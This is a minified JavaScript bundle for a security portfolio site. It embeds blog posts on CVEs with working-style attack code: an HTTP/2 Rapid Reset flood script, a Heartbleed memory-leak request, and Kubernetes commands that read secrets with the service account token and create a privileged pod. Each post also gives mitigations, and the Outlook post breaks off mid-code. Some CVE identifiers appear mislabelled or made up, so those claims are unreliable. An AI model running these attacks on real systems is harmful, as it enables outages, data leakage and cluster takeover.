JS=["All","Security","Research","Web","Desktop","Cloud","Automation","Cryptography","Toolkit"];function QS({activeFilter:t,onFilterChange:e}){return S.jsx("div",{className:"filter-chips",children:JS.map(n=>S.jsx("button",{className:`chip ${n===t?"active":""}`,type:"button",onClick:()=>e(n),children:n},n))})}function eb({items:t}){const[e,n]=Q.useState(0);if(!(t!=null&&t.length))return null;const i=t[e],s=()=>n(a=>(a+1)%t.length),r=()=>n(a=>(a-1+t.length)%t.length);return S.jsxs("div",{className:"featured-carousel",children:[S.jsxs("div",{className:"featured-card",children:[S.jsxs("div",{className:"featured-meta",children:[S.jsx("span",{className:"pill",children:"Featured"}),i.tag&&S.jsx("span",{className:"pill",children:i.tag})]}),S.jsx("h3",{children:i.title}),S.jsx("p",{children:i.description}),S.jsx("div",{className:"project-tags",children:(i.tags||[]).map(a=>S.jsx("span",{className:"pill",children:a},a))}),S.jsx("div",{className:"featured-actions",children:S.jsx("a",{href:i.href,target:"_blank",rel:"noreferrer",className:"link-button",children:"View"})})]}),t.length>1&&S.jsxs("div",{className:"featured-controls",children:[S.jsx("button",{type:"button",onClick:r,className:"button ghost","aria-label":"Previous",children:"←"}),S.jsx("button",{type:"button",onClick:s,className:"button ghost","aria-label":"Next",children:"→"})]})]})}function S0({items:t=[],showViewAll:e=!1,showHeader:n=!0,showFilters:i,showFeatured:s,wrap:r=!0}){const[a,o]=Q.useState("All"),[l,c]=Q.useState(1),p=4,d=t.slice(0,2),h=Q.useMemo(()=>new Set(d.map(T=>T.title)),[d]),f=i??n,v=(s??n)&&a==="All",y=Q.useMemo(()=>a==="All"?t:t.filter(T=>{var A;return(A=T.tags)==null?void 0:A.some(C=>C.toLowerCase().includes(a.toLowerCase().split(" ")[0]))}),[a,t]),m=v?y.filter(T=>!h.has(T.title)):y,u=Math.max(1,Math.ceil(m.length/p)),g=m.slice((l-1)*p,l*p),_=T=>{o(T),c(1)},b=S.jsxs(S.Fragment,{children:[n&&S.jsxs("div",{className:"section-header",children:[S.jsxs("div",{children:[S.jsx("h2",{className:"section-title",children:"Projects"}),S.jsx("p",{className:"section-subtitle",children:"Deployment dossier — hardened builds and offensive prototypes."})]}),e&&S.jsx("div",{className:"section-actions",children:S.jsx(Ft,{className:"link-button",to:"/projects",children:"View all projects"})})]}),f&&S.jsx(QS,{activeFilter:a,onFilterChange:_}),v&&S.jsx(eb,{items:d}),S.jsx("div",{className:"projects-list",children:g.map(T=>{var A;return S.jsxs("div",{className:"project-row",children:[S.jsxs("div",{className:"project-row-body",children:[S.jsx("a",{href:T.href,target:"_blank",rel:"noreferrer",className:"project-title-link",children:S.jsx("h5",{className:"project-title",children:T.title})}),S.jsx("p",{className:"project-description",children:T.description}),(A=T.tags)!=null&&A.length?S.jsx("div",{className:"project-tags",children:T.tags.map(C=>S.jsx("span",{className:"pill",children:C},C))}):null]}),S.jsx("div",{className:"project-row-cta",children:S.jsx("a",{href:T.href,target:"_blank",rel:"noreferrer",className:"view-credentials",children:"View"})})]},T.title)})}),u>1&&S.jsxs("div",{className:"blog-pagination project-pagination",children:[S.jsx("button",{className:"pill",disabled:l===1,onClick:()=>c(Math.max(1,l-1)),type:"button",children:"Previous"}),S.jsxs("span",{className:"blog-page-indicator",children:["Page ",l," of ",u]}),S.jsx("button",{className:"pill",disabled:l===u,onClick:()=>c(Math.min(u,l+1)),type:"button",children:"Next"})]})]});return r?S.jsx("section",{className:"section projects",id:"projects",children:S.jsx("div",{className:"container",children:b})}):S.jsx("div",{className:"projects",children:b})}function Gf(){const t=WS,e=za.slice(0,3);return S.jsxs(S.Fragment,{children:[S.jsx(ZS,{data:GS}),S.jsx("section",{className:"section",children:S.jsxs("div",{className:"container intro-grid",children:[S.jsxs("div",{className:"intro-title",children:[S.jsx("div",{className:"eyebrow",children:"****"}),S.jsx("h2",{className:"section-title",children:"With precision + curiosity, we harden systems."})]}),S.jsxs("div",{className:"intro-body",children:[S.jsx("p",{className:"lead",children:Hf.text}),S.jsx("p",{children:"Every environment tells a story. I help teams surface weak links, stage realistic tests, and ship defenses that hold under pressure."}),S.jsx("div",{className:"hero-meta",children:ld.map(n=>S.jsx("a",{href:n.href,target:"_blank",rel:"noreferrer",className:"pill",children:n.label},n.href))})]})]})}),S.jsx("section",{className:"section",children:S.jsxs("div",{className:"container",children:[S.jsx("div",{className:"section-header",children:S.jsx("h2",{className:"section-title",children:"Experience"})}),S.jsx("div",{className:"logo-grid",children:t.map(n=>S.jsxs("div",{className:"logo-card",children:[S.jsx("div",{className:"logo-role",children:n.role}),S.jsx("div",{className:"logo-org",children:n.org}),S.jsx("div",{className:"logo-range",children:n.range})]},`${n.org}-${n.role}`))})]})}),S.jsx(YS,{data:Hf,socials:ld}),S.jsx(S0,{items:g0,showViewAll:!0,showHeader:!0,showFilters:!1}),S.jsx("section",{className:"section",children:S.jsxs("div",{className:"container",children:[S.jsxs("div",{className:"section-header",children:[S.jsxs("div",{children:[S.jsx("h2",{className:"section-title",children:"Recognitions"}),S.jsx("p",{className:"section-subtitle",children:"Certifications and credentials earned across security and cloud."})]}),S.jsx("div",{className:"section-actions",children:S.jsx(Ft,{className:"link-button",to:"/certifications",children:"View all certifications"})})]}),S.jsx(y0,{items:v0.slice(0,5),showHeader:!1,wrap:!1})]})}),S.jsx("section",{className:"section",children:S.jsxs("div",{className:"container",children:[S.jsxs("div",{className:"section-header",children:[S.jsxs("div",{children:[S.jsx("h2",{className:"section-title",children:"Ops Log"}),S.jsx("p",{className:"section-subtitle",children:"Recent writeups from exploit labs and defensive research."})]}),S.jsx("div",{className:"section-actions",children:S.jsx(Ft,{className:"link-button",to:"/blogs",children:"View all posts"})})]}),S.jsx(x0,{posts:e,wrap:!1})]})})]})}function tb({data:t}){return S.jsx("header",{className:"blog-welcome-section",children:S.jsxs("div",{className:"container",children:[S.jsx("div",{className:"eyebrow",children:"Ops log"}),S.jsx("h1",{children:t.title}),S.jsx("p",{className:"lead",children:t.subtitle})]})})}function nb({posts:t=[],onFilter:e}){const[n,i]=Q.useState(""),s=Q.useMemo(()=>n.trim()?t.filter(a=>a.title.toLowerCase().includes(n.toLowerCase())||a.excerpt.toLowerCase().includes(n.toLowerCase())):t,[n,t]);Q.useEffect(()=>{e==null||e(s)},[s,e]);const r=a=>{i(a.target.value)};return S.jsxs("div",{className:"blog-search",children:[S.jsx("label",{className:"search-label",htmlFor:"blog-search",children:"Search posts"}),S.jsxs("div",{className:"search-shell",children:[S.jsx("i",{className:"fas fa-search search-icon","aria-hidden":"true"}),S.jsx("input",{id:"blog-search",type:"search",value:n,onChange:r,placeholder:"Type a keyword…",className:"search-input"})]})]})}function ib(){const[t,e]=Q.useState(za);return S.jsxs(S.Fragment,{children:[S.jsx(tb,{data:jS}),S.jsx("section",{className:"section",children:S.jsxs("div",{className:"container",children:[S.jsx(nb,{posts:za,onFilter:e}),S.jsx(x0,{posts:t,wrap:!1})]})})]})}const sb=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CVE-2024–0012: HTTP/2 Rapid Reset Attack Explained</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">CVE-2024–0012: HTTP/2 Rapid Reset Attack Explained</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is CVE-2024–0012?</h2>
        <p>
          CVE-2024–0012, known as the HTTP/2 Rapid Reset Attack, was disclosed, affecting major web servers like Apache and Nginx. This denial-of-service (DoS) vulnerability exploits HTTP/2’s stream management system by abusing the RST_STREAM frame. By overwhelming the server with rapid stream resets, attackers can exhaust resources and disrupt services.
        </p>

        <h2>How the Vulnerability Works</h2>
        <h3>HTTP/2 and RST_STREAM</h3>
        <p>
          HTTP/2 allows multiplexing multiple streams over a single connection. The RST_STREAM frame cancels streams when they are no longer needed. However, attackers can send a rapid series of RST_STREAM frames, forcing the server to process and discard streams at an unsustainable rate, leading to resource exhaustion.
        </p>

        <h2>Exploit Code Example</h2>
        <p>
          Below is an educational example in Python that demonstrates how an attacker could exploit this vulnerability using an HTTP/2 library.
        </p>
        <div class="code-block">
          <code>
import h2.connection<br>
import h2.events<br>
import socket<br>
import ssl<br>
import time<br><br>

# Configure target server<br>
TARGET_HOST = "vulnerable-server.com"<br>
TARGET_PORT = 443<br>
STREAM_COUNT = 1000  # Number of streams to abuse<br><br>

def send_reset_attack():<br>
    # Establish SSL/TLS connection<br>
    context = ssl.create_default_context()<br>
    with socket.create_connection((TARGET_HOST, TARGET_PORT)) as raw_sock:<br>
        with context.wrap_socket(raw_sock, server_hostname=TARGET_HOST) as tls_sock:<br>
            # Initialize HTTP/2 connection<br>
            conn = h2.connection.H2Connection()<br>
            conn.initiate_connection()<br>
            tls_sock.sendall(conn.data_to_send())<br><br>

            # Send multiple streams with rapid resets<br>
            for stream_id in range(1, STREAM_COUNT * 2, 2):  # HTTP/2 streams are odd-numbered<br>
                conn.send_headers(<br>
                    stream_id=stream_id,<br>
                    headers=[<br>
                        (":method", "GET"),<br>
                        (":path", "/"),<br>
                        (":authority", TARGET_HOST),<br>
                        (":scheme", "https"),<br>
                    ],<br>
                )<br>
                tls_sock.sendall(conn.data_to_send())<br>
                conn.reset_stream(stream_id)<br>
                tls_sock.sendall(conn.data_to_send())<br>
                print(f"Stream {stream_id} reset sent")<br>
            time.sleep(5)<br><br>

if __name__ == "__main__":<br>
    print(f"Launching HTTP/2 Rapid Reset Attack on {TARGET_HOST}...")<br>
    send_reset_attack()<br>
    print("Attack complete. Check server performance.")<br>
          </code>
        </div>
        <p><strong>Disclaimer:</strong> This code is for educational purposes only. Testing such exploits without proper authorization is unethical and illegal.</p>

        <h2>Mitigation Strategies</h2>
        <ol>
          <li><strong>Apply Server Patches:</strong> Server vendors like Apache and Nginx have released patches to mitigate this vulnerability. Update your software to the latest version.</li>
          <li><strong>Implement Rate-Limiting:</strong> Use rate-limiting to restrict the number of HTTP/2 streams and resets per connection.</li>
          <li><strong>Monitor Server Metrics:</strong> Deploy monitoring tools to detect unusual spikes in resource usage associated with HTTP/2 traffic.</li>
          <li><strong>Disable HTTP/2 Temporarily:</strong> If patching is not feasible, disable HTTP/2 support as a temporary mitigation:
            <ul>
              <li><strong>For Apache:</strong> Remove <code>h2</code> from the <code>Protocols</code> directive:</li>
              <code>Protocols h2 h2c http/1.1</code>
              <li><strong>For Nginx:</strong> Remove the <code>http2</code> directive from server configurations.</li>
            </ul>
          </li>
        </ol>

        <h2>Conclusion</h2>
        <p>
          CVE-2024–0012, or the HTTP/2 Rapid Reset Attack, underscores the importance of securing web servers against denial-of-service attacks. By applying timely patches, implementing rate-limiting, and monitoring server activity, organizations can mitigate this threat and ensure the availability of their services.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,rb=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Heartbleed (CVE-2014–0160)</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">Heartbleed (CVE-2014–0160)</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>Understanding Heartbleed: A Technical Breakdown</h2>
        <p>
          Heartbleed was a flaw in the heartbeat extension of OpenSSL, a widely used library that provides SSL/TLS encryption. The vulnerability was introduced in OpenSSL version 1.0.1 and persisted until version 1.0.1g. The issue stemmed from improper input validation, allowing an attacker to read arbitrary chunks of server memory, up to 64KB per request.
        </p>

        <h3>Heartbeat Extension Basics</h3>
        <p>
          To maintain secure connections, OpenSSL’s heartbeat mechanism allows clients and servers to verify each other’s presence by sending and receiving “heartbeat” messages. Here’s how the message exchange is supposed to work:
        </p>
        <ol>
          <li>A client sends a heartbeat request containing a payload and specifies the payload length.</li>
          <li>The server echoes the payload back to the client to confirm the connection is still alive.</li>
        </ol>
        <p>
          The vulnerability occurs because the server trusts the client-supplied payload length without verifying it against the actual payload size, leading to memory leaks.
        </p>

        <h3>Simplified Vulnerable Code</h3>
        <div class="code-block">
          <code>
int tls1_process_heartbeat(SSL *s) {<br />
&nbsp;&nbsp;unsigned char *p = &s->s3->rrec.data[0];<br />
&nbsp;&nbsp;unsigned short payload;<br />
&nbsp;&nbsp;unsigned char *buffer, *bp;<br />
&nbsp;&nbsp;payload = (p[0] << 8) | p[1];<br />
&nbsp;&nbsp;buffer = OPENSSL_malloc(1 + 2 + payload + 16);<br />
&nbsp;&nbsp;bp = buffer;<br />
&nbsp;&nbsp;*bp++ = TLS1_HB_RESPONSE;<br />
&nbsp;&nbsp;memcpy(bp, p, payload); // Vulnerable<br />
&nbsp;&nbsp;ssl3_write_bytes(s, TLS1_RT_HEARTBEAT, buffer, 3 + payload);<br />
&nbsp;&nbsp;OPENSSL_free(buffer);<br />
}
          </code>
        </div>

        <h2>How Heartbleed Works</h2>
        <p>
          An attacker can exploit this vulnerability by sending a malicious heartbeat request where the payload length is intentionally larger than the actual payload.
        </p>

        <h3>Exploit Example in Python</h3>
        <div class="code-block">
          <code>
import socket<br />
import struct<br />
def create_heartbeat_request():<br />
&nbsp;&nbsp;hb_type = 1<br />
&nbsp;&nbsp;payload = b"Hi"<br />
&nbsp;&nbsp;payload_length = 0xFFFF<br />
&nbsp;&nbsp;return struct.pack(">BHH", hb_type, len(payload), payload_length) + payload<br />
def send_heartbeat_request(host, port):<br />
&nbsp;&nbsp;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br />
&nbsp;&nbsp;s.connect((host, port))<br />
&nbsp;&nbsp;s.send(create_heartbeat_request())<br />
&nbsp;&nbsp;response = s.recv(65535)<br />
&nbsp;&nbsp;print("Leaked memory:", response)<br />
send_heartbeat_request("example.com", 443)
          </code>
        </div>

        <h2>Global Chaos and Real-World Impact</h2>
        <p>
          The Heartbleed vulnerability affected a significant portion of the internet, with estimates suggesting that 17% of all secure web servers were compromised. Major companies were forced to take immediate action to patch their systems.
        </p>

        <h2>Detecting Heartbleed</h2>
        <p>
          Security tools like Nmap can be used to detect Heartbleed vulnerabilities. Use the following command:
        </p>
        <div class="code-block">
          <code>
nmap -p 443 --script ssl-heartbleed example.com
          </code>
        </div>

        <h2>Lessons Learned</h2>
        <ul>
          <li><strong>Input Validation:</strong> Validate all inputs, especially lengths and buffer sizes.</li>
          <li><strong>Automated Patching Systems:</strong> Ensure systems are regularly updated.</li>
          <li><strong>Memory Safety Practices:</strong> Use memory-safe programming languages like Rust.</li>
        </ul>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,ab=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CVE-2024–1001: Kubernetes RBAC Misconfiguration</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">CVE-2024–1001: Kubernetes RBAC Misconfiguration</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is CVE-2024–1001?</h2>
        <p>
          Kubernetes relies heavily on Role-Based Access Control (RBAC) to manage permissions. However, in early 2024, CVE-2024–1001 was disclosed, revealing how misconfigured RBAC rules in Kubernetes could allow attackers to gain full control over a cluster. This vulnerability emphasizes the risks of poorly defined access policies.
        </p>

        <h3>RBAC in Kubernetes</h3>
        <p>
          RBAC allows administrators to define who can access resources in a Kubernetes cluster and what actions they can perform. Permissions are granted using Roles, Cluster Roles, and Role Bindings.
        </p>

        <h2>The Vulnerability</h2>
        <p>
          CVE-2024–1001 occurs when overly permissive RBAC configurations allow attackers to escalate privileges. Specifically:
        </p>
        <ul>
          <li>Permissions like “create” or “patch” on sensitive resources (e.g., Pods) can be abused.</li>
          <li>Attackers can deploy malicious workloads, extract secrets, or control the cluster API server.</li>
        </ul>

        <h2>Exploit Workflow</h2>
        <h3>RBAC Misconfiguration</h3>
        <div class="code-block">
          <code>
apiVersion: rbac.authorization.k8s.io/v1<br>
kind: Role<br>
metadata:<br>
&nbsp;&nbsp;namespace: vulnerable-namespace<br>
&nbsp;&nbsp;name: overly-permissive-role<br>
rules:<br>
- apiGroups: [""]<br>
&nbsp;&nbsp;resources: ["pods", "secrets"]<br>
&nbsp;&nbsp;verbs: ["get", "create", "patch"]<br>
          </code>
        </div>
        <p>This Role allows anyone bound to it to create and patch Pods and access secrets in the namespace.</p>

        <h3>Step-by-Step Exploit</h3>
        <ol>
          <li><strong>Gain Initial Access:</strong> Assume the attacker has access to a low-privileged service account in the namespace, bound to the misconfigured Role.</li>
          <li><strong>Create a Malicious Pod:</strong> Use the <code>kubectl</code> command to create a Pod with elevated privileges:
            <div class="code-block">
              <code>
kubectl run malicious-pod --image=alpine --restart=Never -- /bin/sh -c "apk add curl; while true; do sleep 3600; done"
              </code>
            </div>
          </li>
          <li><strong>Access Sensitive Secrets:</strong> Once the Pod is running, exec into it:
            <div class="code-block">
              <code>
kubectl exec -it malicious-pod -- /bin/sh<br>
# Inside the Pod:<br>
curl -s -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \\ <br>
https://kubernetes.default.svc/api/v1/namespaces/vulnerable-namespace/secrets
              </code>
            </div>
          </li>
          <li><strong>Escalate Privileges:</strong> Create Pods with privileged containers:
            <div class="code-block">
              <code>
kubectl apply -f - <<EOF<br>
apiVersion: v1<br>
kind: Pod<br>
metadata:<br>
&nbsp;&nbsp;name: root-access-pod<br>
&nbsp;&nbsp;namespace: kube-system<br>
spec:<br>
&nbsp;&nbsp;containers:<br>
&nbsp;&nbsp;- name: root-access-container<br>
&nbsp;&nbsp;&nbsp;&nbsp;image: alpine<br>
&nbsp;&nbsp;&nbsp;&nbsp;securityContext:<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;privileged: true<br>
&nbsp;&nbsp;&nbsp;&nbsp;command: ["/bin/sh", "-c", "while true; do sleep 3600; done"]<br>
EOF
              </code>
            </div>
          </li>
        </ol>

        <h2>Mitigation Strategies</h2>
        <ol>
          <li><strong>Enforce the Principle of Least Privilege:</strong> Grant only the minimum permissions necessary for users and service accounts to perform their tasks. Avoid broad permissions like “create” or “patch” on sensitive resources.</li>
          <li><strong>Audit RBAC Policies:</strong> Regularly audit your RBAC configurations to identify overly permissive Roles and ClusterRoles:
            <div class="code-block">
              <code>
kubectl get roles,clusterroles,rolebindings,clusterrolebindings --all-namespaces
              </code>
            </div>
          </li>
          <li><strong>Use Pod Security Standards:</strong> Apply Pod Security Standards (PSS) to restrict privileged Pod creation:
            <div class="code-block">
              <code>
apiVersion: policy/v1beta1<br>
kind: PodSecurityPolicy<br>
metadata:<br>
&nbsp;&nbsp;name: restricted<br>
spec:<br>
&nbsp;&nbsp;privileged: false
              </code>
            </div>
          </li>
          <li><strong>Enable Logging and Monitoring:</strong> Monitor for suspicious activities, such as unauthorized Pod creation or access to secrets. Tools like Falco or Kubernetes Audit Logs can help.</li>
          <li><strong>Use Network Policies:</strong> Restrict Pod-to-Pod communication using Kubernetes Network Policies to limit the attack surface.</li>
        </ol>

        <h2>Conclusion</h2>
        <p>
          CVE-2024–1001 underscores the importance of careful RBAC configuration in Kubernetes. Misconfigured permissions can open the door to attackers, allowing them to escalate privileges and take over a cluster. By enforcing least privilege, auditing RBAC policies, and using Pod Security Standards, organizations can safeguard their Kubernetes environments.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,ob=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CVE-2017–11882: Microsoft Office Memory Corruption Vulnerability</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">CVE-2017–11882: Microsoft Office Memory Corruption Vulnerability</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is CVE-2017–11882?</h2>
        <p>
          CVE-2017–11882 is a critical vulnerability within Microsoft Office’s Equation Editor component. This legacy feature, designed for displaying mathematical equations, contains a memory corruption flaw that lets attackers execute malicious code when users open a specially crafted document. Attackers can exploit this weakness to install malware, steal data, or gain full control over a target system with the same permissions as the user.
        </p>

        <h3>Affected Office Versions:</h3>
        <ul>
          <li>Microsoft Office 2007 (Service Pack 3)</li>
          <li>Microsoft Office 2010 (Service Pack 2)</li>
          <li>Microsoft Office 2013 (Service Pack 1)</li>
          <li>Microsoft Office 2016</li>
        </ul>
        <p>
          Despite being patched in November 2017, the Equation Editor vulnerability remains a key target, with unpatched systems or older Office versions still vulnerable.
        </p>

        <h2>How the Vulnerability Works</h2>
        <p>
          This vulnerability allows remote code execution (RCE) by corrupting memory through Office’s Object Linking and Embedding (OLE) feature when opening a malicious document. Here’s how an attack typically unfolds:
        </p>
        <ol>
          <li><strong>Phishing:</strong> The attacker sends an email with an attachment, like a Word or Excel document, designed to exploit CVE-2017–11882.</li>
          <li><strong>User Action:</strong> The user opens the document, unknowingly triggering malicious code within the Equation Editor.</li>
          <li><strong>System Compromise:</strong> The attacker gains control over the system, potentially installing further malware, stealing sensitive data, or using the compromised system to attack other network resources.</li>
        </ol>

        <h2>Why CVE-2017–11882 Remains a Top Target</h2>
        <p>
          This vulnerability is highly favored by cybercriminals and nation-state hackers from countries like China, Russia, and North Korea. Both the Department of Homeland Security and the FBI have flagged it as a frequently exploited vulnerability. Its persistence can be attributed to:
        </p>
        <ul>
          <li><strong>Ease of Exploitation:</strong> Attackers only need to convince users to open a document, making social engineering attacks highly effective.</li>
          <li><strong>Legacy Code:</strong> The Equation Editor, dating back to 2000, is incompatible with modern Office security features, making it difficult to defend without patching.</li>
          <li><strong>Prevalence of Unpatched Systems:</strong> Many organizations, particularly those with older Office versions, haven’t applied Microsoft’s 2017 patch, leaving them vulnerable.</li>
        </ul>

        <h2>How to Protect Against CVE-2017–11882</h2>
        <p>
          With patches readily available, mitigating CVE-2017–11882 is straightforward, yet it requires proactive security practices. Here’s how organizations can protect themselves:
        </p>
        <ol>
          <li><strong>Update Microsoft Office:</strong> Ensure all Office versions are up-to-date with Microsoft’s security patches. Microsoft’s November 2017 patch addresses CVE-2017–11882 and should be applied immediately to unpatched systems.</li>
          <li><strong>Disable the Equation Editor:</strong> If this feature is unnecessary for your organization, disable it. Doing so removes a significant attack vector.</li>
          <li><strong>Use Modern Endpoint Protection:</strong> Employ advanced endpoint security tools that can detect and block malicious document activity. Many modern security solutions offer protections specifically designed to detect CVE-2017–11882 exploitation.</li>
          <li><strong>User Awareness and Training:</strong> Social engineering plays a significant role in the success of attacks exploiting this vulnerability. Educate users on the risks of opening unknown attachments or clicking links in unsolicited emails.</li>
        </ol>

        <h2>Staying Ahead of Persistent Threats</h2>
        <p>
          The continued exploitation of CVE-2017–11882 underscores the importance of regular patching, user education, and layered security defenses. A vulnerability like this, embedded in software many organizations rely on daily, is a stark reminder that cybersecurity requires constant vigilance.
        </p>
        <p>
          By applying patches, disabling unused features, and maintaining a robust security posture, organizations can effectively protect themselves against even the oldest and most persistent threats in today’s digital landscape. In cybersecurity, diligence, and preparedness are the best defenses against exploitation — whether it’s a vulnerability from yesterday or one that emerges tomorrow.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,lb=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CVE-2023–23397: Microsoft Outlook NTLM Credential Theft</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">CVE-2023–23397: Microsoft Outlook NTLM Credential Theft</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>How CVE-2023–23397 Works</h2>
        <p>
          The vulnerability exploits how Microsoft Outlook handles reminders and calendar invites. Normally, Outlook processes these items to display notifications and updates. However, in this case, attackers can create a specially crafted message that tricks Outlook into making an outbound connection to a server under the attacker’s control. This connection is made using NTLM authentication, sending the victim’s NTLM credentials and exposing them to potential misuse.
        </p>

        <h3>Exploit Scenario</h3>
        <ol>
          <li>An attacker crafts a malicious email containing a reminder or calendar invite.</li>
          <li>The email specifies a UNC (Universal Naming Convention) path that points to an attacker-controlled server.</li>
          <li>When Outlook receives and processes this email, it automatically tries to access the specified UNC path, triggering NTLM authentication and sending the victim’s credentials to the attacker.</li>
        </ol>

        <h3>Code and Example</h3>
        <div class="code-block">
          <code>
import http.server<br>
import socketserver<br><br>
class MyRequestHandler(http.server.SimpleHTTPRequestHandler):<br>
&nbsp;&nbsp;&nbsp;&nbsp;def do_GET(self):<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(f"Received connection from: {self.client_address}")<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.send_response(200)<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.end_headers()<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.wfile.write(b"Hello, you've been logged!")<br><br>
PORT = 8000<br>
handler = MyRequestHandler<br>
with socketserver.TCPServer(("", PORT), handler) as httpd:<br>
